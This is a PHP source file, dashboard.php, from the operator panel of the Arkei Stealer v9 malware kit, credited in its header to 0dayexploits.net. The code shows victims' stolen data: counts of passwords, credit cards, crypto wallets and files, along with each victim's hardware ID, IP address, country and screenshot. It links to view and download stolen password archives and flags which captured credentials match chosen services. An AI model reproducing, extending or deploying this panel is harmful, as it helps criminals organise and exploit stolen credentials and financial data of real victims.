<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) 0dayexploits.net
*
* -------------------------------------------------------------
* [dashboard.php]
*    Dashboard Page
*/

require("../app/config.php");
require("../app/utils.php");

session_start();
error_reporting(0);

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

// check user
$userProfile = $_SESSION["profile"];

// request params
$p 			= checkParam($_GET["p"]);

// AJAX
$request		= checkParam($_GET["req"]);
$comment		= checkParam($_GET["comment"]);
$log_id_ajax	= checkParam($_GET["id"]);

// DELETE LOG
$action			= checkParam($_GET["action"]);
$log_id_delete	= checkParam($_GET["id"]);

// DELETE LOGS AJAX
$action			= checkParam($_GET["action"]);
$ids			= checkParam($_GET["ids"]);

if(strlen($p) > 6)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
}

$d = $p - 1;



$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	// AJAX
	if($request != null)
	{
		if($request == "update_comment")
		{
			$_log_id_ajax = mysqli_real_escape_string($database, $log_id_ajax);
			$_comment = mysqli_real_escape_string($database, $comment);
			
			$database->query("UPDATE `logs` SET `comment`='$_comment' WHERE `id`='$_log_id_ajax'");
			echo "success";
		}
		
		if($request == "set_checked")
		{
			$_log_id_ajax = mysqli_real_escape_string($database, $log_id_ajax);
			
			$database->query("UPDATE `logs` SET `status`='1' WHERE `id`='$_log_id_ajax'");
			echo "success";
		}
		
		exit(0);
	}
	
	// DELETE LOG
	if($action != null)
	{
		if($action == "delete")
		{
			$log_id_delete = mysqli_real_escape_string($database, $log_id_delete);
		
			$database->query("DELETE FROM `logs` WHERE `id`='$log_id_delete'");
			
			echo "<script>window.close();</script>";
		}
		
		if($action == "delete_logs")
		{
			$ids = substr($ids, 0, -1);
			$logs_to_delete = explode(",", $ids);
			
			foreach ($logs_to_delete as $logID)
			{
				$logID = mysqli_real_escape_string($database, $logID);
		
				$database->query("DELETE FROM `logs` WHERE `id`='$logID'");
			}
			
			echo "success";
		}
		
		exit(0);
	}
	
	if($p)
	{
		if($userProfile == "0")
		{
			$logs = $database->query('SELECT * FROM `logs` ORDER BY `id` DESC LIMIT '. $d .'00, '. $p .'00;');
		}
		else
		{
			$logs = $database->query('SELECT * FROM `logs` WHERE `profile`=\'$userProfile\' ORDER BY `id` DESC LIMIT '. $d .'00, '. $p .'00;');
		}
	}
	else
	{
		if($userProfile == "0")
		{
			$logs = $database->query("SELECT * FROM `logs` ORDER BY `id` DESC LIMIT 100;");
		}
		else
		{
			$logs = $database->query("SELECT * FROM `logs` WHERE `profile`='$userProfile' ORDER BY `id` DESC LIMIT 100;");
		}
	}
	
	// logs count
	// ==========================================
	$logscount;
	
	if($userProfile == "0")
	{
		$logscount = $database->query("SELECT COUNT(*) FROM `logs`")->fetch_array();
	}
	else
	{
		$logscount = $database->query("SELECT COUNT(*) FROM `logs` WHERE `profile`='$userProfile'")->fetch_array();
	}
	
	$all_logs = $logscount[0];
	
	// passwords count
	// ==========================================
	$all_passwords = 0;
	$logsPasswords;
	
	if($userProfile == "0")
	{
		$logsPasswords = $database->query("SELECT `passwords` FROM `logs`");
	}
	else
	{
		$logsPasswords = $database->query("SELECT `passwords` FROM `logs` WHERE `profile`='$userProfile'");
	}
	
	while ($logPasswords = $logsPasswords->fetch_assoc())
	{
		$all_passwords = $all_passwords + $logPasswords["passwords"];
	}
	
	$all_errors 	= $database->query("SELECT * FROM `stats` WHERE `Name`='errors';")->fetch_array();
	
	$_bots_active = 0;
	
	if($userProfile == "0")
	{
		$_data = date("d/m/Y");
		$_bots = $database->query("SELECT COUNT(1) FROM `logs`");
		$_b = $_bots->fetch_assoc();
		$_bots_a_sql = $database->query("SELECT * FROM `logs`");
		
		while ($_bots_a = $_bots_a_sql->fetch_assoc())
		{
			$_bot_last_online = $_bots_a["date"];
			$_last_online_date = explode(' ', $_bot_last_online);
			if($_last_online_date[0] == $_data)
			{
				$_bots_active++;
			}	
		}
	}
	else
	{
		$_data = date("d/m/Y");
		$_bots = $database->query("SELECT COUNT(1) FROM `logs` WHERE `profile`='$userProfile'");
		$_b = $_bots->fetch_assoc();
		$_bots_a_sql = $database->query("SELECT * FROM `logs` WHERE `profile`='$userProfile'");
		
		while ($_bots_a = $_bots_a_sql->fetch_assoc())
		{
			$_bot_last_online = $_bots_a["date"];
			$_last_online_date = explode(' ', $_bot_last_online);
			if($_last_online_date[0] == $_data)
			{
				$_bots_active++;
			}	
		}
	}
}


$pageName = "Dashboard";
require("template/header.tmpl.php");

?>
<style>
</style>

<div class="wrapper">
	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
					<h4 class="page-title">Dashboard</h4>
				</div>
			</div>
		</div> 

		<div class="row">
			
			<div class="col-xl-3 col-lg-6">
				<div class="card widget-flat">
					<div class="card-body p-0">
						<div class="p-3 pb-0">
							<h5 class="text-muted font-weight-normal mt-0">Total Reports</h5>
								<h3 class="mt-2"><?php echo $all_logs; ?></h3>
						</div>
					</div>
				</div>
			</div>
			
			<div class="col-xl-3 col-lg-6">
				<div class="card widget-flat">
					<div class="card-body p-0">
						<div class="p-3 pb-0">
							<h5 class="text-muted font-weight-normal mt-0">Reports Today</h5>
							<h3 class="mt-2"><?php echo $_bots_active; ?></h3>
						</div>
					</div>
				</div>
			</div>
			
			<div class="col-xl-3 col-lg-6">
				<div class="card widget-flat">
					<div class="card-body p-0">
						<div class="p-3 pb-0">
							<h5 class="text-muted font-weight-normal mt-0">Passwords</h5>
							<h3 class="mt-2"><?php echo $all_passwords; ?></h3>
						</div>
					</div>
				</div>
			</div>
			
			<div class="col-xl-3 col-lg-6">
				<div class="card widget-flat">
					<div class="card-body p-0">
						<div class="p-3 pb-0">
							<h5 class="text-muted font-weight-normal mt-0">Errors</h5>
							<h3 class="mt-2"><?php echo $all_errors["Value"]; ?></h3>
						</div>
					</div>
				</div>
			</div>
		
		</div>
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
					<form name="delete_logs" method="POST">
						<h4 class="header-title">Reports</h4>
							<button type="button" onclick="SelectAll(this);" class="btn btn-info">Select all</button>
							<button type="button" onclick="UnselectAll(this);" class="btn btn-warning">Unselect all</button>
							<button type="button" onclick="DeleteLogs();" class="btn btn-danger">Delete selected</button>
							<br><br>
							
							<?php
									if($p != null)
									{
										$next = $p + 1;
										$past = $p - 1;
									}
									else
									{
										$p = 1;
										$next = 2;
										$past = null;
									}
								?>
							
							<ul class="pagination pagination-sm">
                                        <li class="page-item">
                                            <a class="page-link" href="dashboard.php?p=<?php echo $past; ?>">
                                                <span>Previous</span>
                                            </a>
                                        </li>
										<?php
										
										if($p != "")
										{
											if($p != "1")
											{
												?><li class="page-item"><a class="page-link" href="dashboard.php?p=<?php echo $p-1; ?>"><?php echo $p-1; ?></a></li><?php
											}
										}
										
										?>
                                        <li class="page-item"><a class="page-link" href="#"><?php if($p == null) { echo "1"; }else { echo $p; } ?></a></li>
										<li class="page-item"><a class="page-link" href="dashboard.php?p=<?php echo $p+1; ?>"><?php echo $p+1; ?></a></li>
                                        <li class="page-item">
                                            <a class="page-link" href="dashboard.php?p=<?php echo $next; ?>">
                                                <span>Next</span>
                                            </a>
                                        </li>
                                    </ul>
							
							<div class="table-responsive mt-3" >
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Select</th>
											<th>ID</th>
											<th>Stats</th>
											<th>System</th>
											<th>Network</th>
											<th>Date Time</th>
											<th>Screenshot</th>
											<th>Comment</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<?php
									while ($log = $logs->fetch_assoc())
									{
									?>
										<tr>
												<?php
										switch($log["status"])
										{
											case 0:
												?><td style="color: red;"><input class="checkbox" type="checkbox" name="brand[]" value="<?php echo $log["id"]; ?>" id="checkbox" /><br>Not checked</td><?php
												break;
												
											case 1:
												?><td style="color: green;"><input class="checkbox" type="checkbox" name="brand[]" value="<?php echo $log["id"]; ?>" id="checkbox" /><br>Checked</td><?php
												break;
										}
										?>
											<td><b>#<?php echo $log["id"]; ?></b><br><?php 
									$profileID = $log["profile"];
									$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
					
									echo $profile["Name"];?></td>
											<td>
												<span style="display: inline;"><i class="mdi mdi-key"></i> <?php echo $log["passwords"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-credit-card"></i> <?php echo $log["cc"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-wallet"></i> <?php echo $log["coins"]; ?> </span>
												<span style="display: inline;"><i class="mdi mdi-file"></i> <?php echo $log["files"]; ?> </span>
												<?php
												
												if($log["telegram"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-telegram"></i> </span><?php
												}
												
												if($log["skype"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-skype"></i> </span><?php
												}
												
												if($log["steam"] > 0)
												{
													?><span style="display: inline;"><i class="mdi mdi-steam"></i> </span><?php
												}
												
												?>
												<br>
												<?php
												
												$presets = $database->query("SELECT * FROM `presets`;");
												
												while ($preset = $presets->fetch_assoc())
												{
													$services = explode(";", $preset["services"]);
													
													foreach ($services as $service)
													{
														checkPreset($config, $log, $service, $preset["color"]);
													}
												}
												
												?>
											</td>
											<td><b><?php echo $log["hwid"]; ?></b><br>
											<small class="u-block u-text-mute"><?php echo $log["system"]; ?></small></td>
											<td><b><?php echo $log["ip"]; ?></b><br><?php echo $log["country"]; ?></td>
											<td><span style="display: inline;"><b><?php
												
											$date_str = str_replace (' ','-', $log["date"]); 
											echo $date_str."</b></span><br>("; 
											
											$actual_date = new DateTime("now");
											$log_date = DateTime::createFromFormat('d/m/Y H:i:s', $log["date"]);
											$time_diff = $log_date->diff($actual_date);
											
											if($time_diff->format('%m') != 0)
											{
												echo $time_diff->format('%m')."m. ";
											}
											
											if($time_diff->format('%d') != 0)
											{
												echo $time_diff->format('%d')."d. ";
											}
											
											if($time_diff->format('%H') != 0)
											{
												echo $time_diff->format('%H')."h. ";
											}
											
											if($time_diff->format('%i') != 0)
											{
												echo $time_diff->format('%i')."m. ";
											}
											
											if($time_diff->format('%s') != 0)
											{
												echo $time_diff->format('%s')."s. ago)";
											}
												
											?></td>
											<td><a href="viewer.php?log=<?php echo $log["user"]; ?>&file=/screenshot.jpg" target="_blank"><img src="viewer.php?log=<?php echo $log["user"]; ?>&file=/screenshot.jpg" height="80" /></a><br>
											<td>
												<div class="input-group">
													<input id="new_comment<?php echo $log["id"]; ?>" class="form-control" title="<?php echo $log["comment"]; ?>" value="<?php echo $log["comment"]; ?>" placeholder="Leave a comment..." type="text">
													<div class="input-group-append">
														<button id="save_comment" onclick="UpdateComment(<?php echo $log["id"]; ?>);" class="btn btn-success" type="button"><i class="mdi mdi-content-save"></i></button>
													</div>
												</div>
											</td>
											<td>
												<div class="btn-group">
													<button type="button" class="btn btn-info dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
													<div class="dropdown-menu">
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<?php echo $log["user"]; ?>">View online</a>
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<?php echo $log["user"]; ?>&file=/passwords.txt">View passwords</a>
														<div class="dropdown-divider"></div>
														<a style="cursor: pointer;" class="dropdown-item" onclick="SetChecked(<?php echo $log["id"]; ?>);">Set checked</a>
														<div class="dropdown-divider"></div>
														<a class="dropdown-item" target="_blank" href="viewer.php?log=<?php echo $log["user"]; ?>&action=download">Download</a>
														<div class="dropdown-divider"></div>
														<a class="dropdown-item" target="_blank" href="dashboard.php?action=delete&id=<?php echo $log["id"]; ?>">Delete</a>
													</div>
												</div>
											</td>
										</tr>
										
									<?php
									}
									?>
									</tbody>
								</table>
								
								<nav style="margin-top: 20px;">
                                    <ul class="pagination pagination-sm">
                                        <li class="page-item">
                                            <a class="page-link" href="dashboard.php?p=<?php echo $past; ?>">
                                                <span>Previous</span>
                                            </a>
                                        </li>
										<?php
										
										if($p != "")
										{
											if($p != "1")
											{
												?><li class="page-item"><a class="page-link" href="dashboard.php?p=<?php echo $p-1; ?>"><?php echo $p-1; ?></a></li><?php
											}
										}
										
										?>
                                        <li class="page-item"><a class="page-link" href="#"><?php if($p == null) { echo "1"; }else { echo $p; } ?></a></li>
										<li class="page-item"><a class="page-link" href="dashboard.php?p=<?php echo $p+1; ?>"><?php echo $p+1; ?></a></li>
                                        <li class="page-item">
                                            <a class="page-link" href="dashboard.php?p=<?php echo $next; ?>">
                                                <span>Next</span>
                                            </a>
                                        </li>
                                    </ul>
                                </nav>
							</div>
					</form>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");


function checkPreset($config, $log, $site, $color)
{
	$zip = new ZipArchive;
	$reading = "";
	
	if ($zip->open('../'.$config["logs_folder"].'/'. $log["user"] .'') === TRUE) 
	{
		$reading = $zip->getFromName("/passwords.txt");
		$zip->close();
		
		$reading = nl2br($reading);
		$pos = stripos($reading, $site);
		
		if ($pos !== false)
		{
			echo '<span style="color: '.$color.'">'.$site.'</span> ';
		}
	}
}

?>